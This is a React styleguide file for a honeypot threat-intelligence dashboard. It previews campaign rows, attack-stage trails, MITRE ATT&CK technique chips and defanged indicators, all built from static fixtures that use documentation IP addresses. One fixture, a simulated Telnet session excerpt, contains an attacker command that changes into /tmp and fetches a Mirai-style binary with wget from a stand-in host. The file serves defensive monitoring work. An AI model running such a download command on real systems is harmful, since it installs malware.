/* eslint-disable react-refresh/only-export-components -- a styleguide section exports its registry entry next to its component. */
import { CampaignRow } from "@/components/campaigns/campaign-row"
import { ExcerptBlock } from "@/components/campaigns/excerpt-block"
import { IndicatorList } from "@/components/campaigns/indicator-list"
import { STAGE_ICON } from "@/components/campaigns/stage-icons"
import { StageTrail } from "@/components/campaigns/stage-trail"
import { TechniqueChips } from "@/components/campaigns/technique-chips"
import { TechniqueTable } from "@/components/techniques/technique-table"
import {
  STAGES,
  STAGE_META,
  type Campaign,
  type CampaignIndicator,
  type Matrix,
  type StoryStage,
} from "@/lib/campaigns"
import { Section, Specimen } from "./parts"
import type { FeatureSection } from "./registry"

/* Static fixtures, documentation addresses only. */

const NOW = Date.now()
const ago = (ms: number) => new Date(NOW - ms).toISOString()
const HOUR = 3_600_000

const CAMPAIGN: Campaign = {
  id: 3,
  name: "Mirai-style loader over Telnet #3",
  status: "active",
  merged_into: null,
  first_seen: ago(30 * HOUR),
  last_seen: ago(3 * HOUR),
  sessions: 87,
  sources: 23,
  countries: ["NL", "DE", "BR"],
  asns: [64496, 64497],
  sensors: ["telnet", "ssh"],
  techniques: ["T1110", "T1059.004", "T1105"],
  stages: ["access", "execution", "tool_transfer"],
  tags: ["mirai"],
  families: ["mirai"],
  severity: "severe",
  rep_session_id: null,
  demo: true,
}

const QUIET: Campaign = {
  ...CAMPAIGN,
  id: 10,
  name: "Password-list guessing over SSH #10",
  status: "quiet",
  sessions: 1840,
  sources: 31,
  sensors: ["ssh"],
  stages: ["recon", "access"],
  families: [],
  severity: "notice",
  last_seen: ago(12 * 24 * HOUR),
}

const technique = (id: string, name: string, plain: string) => ({
  id,
  name,
  plain,
  url: `https://attack.mitre.org/techniques/${id.replace(".", "/")}/`,
})

const STORY: StoryStage[] = [
  {
    stage: "access",
    label: "Getting in",
    summary: "They guessed passwords until one worked.",
    techniques: [
      technique("T1110", "Brute Force", "guessed passwords"),
      technique("T1078", "Valid Accounts", "logged in with a working password"),
    ],
  },
  {
    stage: "execution",
    label: "Running code",
    summary: "They typed shell commands.",
    techniques: [
      technique("T1059.004", "Command and Scripting Interpreter: Unix Shell", "typed commands"),
    ],
  },
  {
    stage: "tool_transfer",
    label: "Bringing tools",
    summary: "They downloaded a tool onto the machine.",
    techniques: [technique("T1105", "Ingress Tool Transfer", "downloaded a tool")],
  },
]

const INDICATORS: CampaignIndicator[] = [
  {
    kind: "payload_host",
    value: "203.0.113.66",
    defanged: "203[.]0[.]113[.]66",
    confidence: "normal",
    sources: 14,
    first_seen: ago(30 * HOUR),
    last_seen: ago(3 * HOUR),
  },
  {
    kind: "family",
    value: "mirai",
    defanged: "mirai",
    confidence: "normal",
    sources: 9,
    first_seen: ago(30 * HOUR),
    last_seen: ago(3 * HOUR),
  },
]

const DAYS = Array.from({ length: 14 }, (_, i) =>
  new Date(NOW - (13 - i) * 24 * HOUR).toISOString().slice(0, 10),
)
const wave = (base: number, phase: number) =>
  DAYS.map((_, i) => Math.max(0, Math.round(base * (0.5 + 0.5 * Math.sin(i / 2 + phase)))))

const MATRIX: Matrix = {
  since: DAYS[0] ?? "",
  until: DAYS.at(-1) ?? "",
  days: DAYS,
  stages: [],
  rows: [
    ["T1082", "System Information Discovery", "recon", 40, 0],
    ["T1110", "Brute Force", "access", 120, 1],
    ["T1059.004", "Command and Scripting Interpreter: Unix Shell", "execution", 50, 2],
    ["T1105", "Ingress Tool Transfer", "tool_transfer", 18, 3],
  ].map(([id, name, stage, base, phase]) => {
    const counts = wave(Number(base), Number(phase))
    return {
      id: String(id),
      name: String(name),
      tactic: "",
      stage: stage as Matrix["rows"][number]["stage"],
      url: `https://attack.mitre.org/techniques/${String(id).replace(".", "/")}/`,
      plain: "",
      total_sessions: counts.reduce((a, b) => a + b, 0),
      total_events: 0,
      counts,
    }
  }),
}

function CampaignsSection() {
  return (
    <Section
      id="campaigns"
      title="Campaigns and stages"
      description="An attack is told in up to six stages, always in the same order. Stages are neutral: an icon and a name, never a hue (hues mean sensor families and severity). Seen and not seen differ by shape and words."
    >
      <div className="grid gap-4">
        <Specimen label="Stage icons (neutral, always next to their name)">
          {STAGES.map((s) => {
            const Icon = STAGE_ICON[s]
            return (
              <span key={s} className="inline-flex items-center gap-1.5 text-sm text-fg">
                <Icon aria-hidden className="size-4 text-fg-muted" strokeWidth={1.75} />
                {STAGE_META[s].label}
              </span>
            )
          })}
        </Specimen>
        <Specimen label="StageTrail variant=compact (lists): icon = seen, dot = not seen, words under">
          <StageTrail stages={["access", "execution", "tool_transfer"]} />
          <StageTrail stages={["recon", "access"]} />
          <StageTrail stages={["access"]} />
          <StageTrail stages={STAGES} />
        </Specimen>
        <Specimen label="StageTrail variant=steps (campaign detail): solid ring = seen, dashed = not seen">
          <StageTrail
            stages={["access", "execution", "tool_transfer"]}
            variant="steps"
            className="w-full max-w-2xl"
          />
        </Specimen>
        <Specimen label="TechniqueChips: the ATT&CK techniques of a campaign, once each">
          <TechniqueChips stages={STORY} campaignId={3} className="w-full max-w-2xl" />
        </Specimen>
        <Specimen label="ExcerptBlock: text only, repeats folded into a count">
          <ExcerptBlock
            className="w-full max-w-2xl"
            excerpt={{
              session_id: "sg-1",
              sensor: "telnet",
              lines: [
                { kind: "login", text: "login as admin" },
                { kind: "command", text: "whoami" },
                { kind: "command", text: "whoami" },
                { kind: "command", text: "whoami" },
                { kind: "command", text: "cd /tmp; wget http://203.0.113.66/x86" },
                { kind: "download", text: "http://203.0.113.66/x86" },
              ],
            }}
          />
        </Specimen>
        <div className="overflow-hidden rounded-lg border bg-surface shadow-sm">
          <div className="border-b px-4 py-2 font-mono text-2xs text-fg-subtle">
            CampaignRow (active, quiet)
          </div>
          <ul className="divide-y">
            <li>
              <CampaignRow campaign={CAMPAIGN} />
            </li>
            <li>
              <CampaignRow campaign={QUIET} />
            </li>
          </ul>
        </div>
        <Specimen label="IndicatorList: defanged, copyable">
          <div className="w-full max-w-sm">
            <IndicatorList items={INDICATORS} />
          </div>
        </Specimen>
        <Specimen label="TechniqueTable: busiest first, with a sparkline per technique">
          <TechniqueTable matrix={MATRIX} className="w-full" />
        </Specimen>
      </div>
    </Section>
  )
}

export const section: FeatureSection = {
  id: "campaigns",
  label: "Campaigns",
  order: 15,
  Component: CampaignsSection,
}
